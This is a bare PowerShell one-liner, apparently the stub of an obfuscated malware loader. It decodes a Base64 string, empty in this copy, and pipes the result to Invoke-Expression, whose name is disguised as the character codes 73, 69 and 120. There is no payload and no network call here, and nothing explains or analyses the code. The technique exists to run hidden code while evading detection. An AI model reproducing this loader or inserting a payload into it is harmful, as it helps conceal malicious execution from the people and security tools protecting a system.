$RNOCEUUC="";$PWBDMOHU=[System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($RNOCEUUC));$PWBDMOHU|&([char]73+[char]69+[char]120)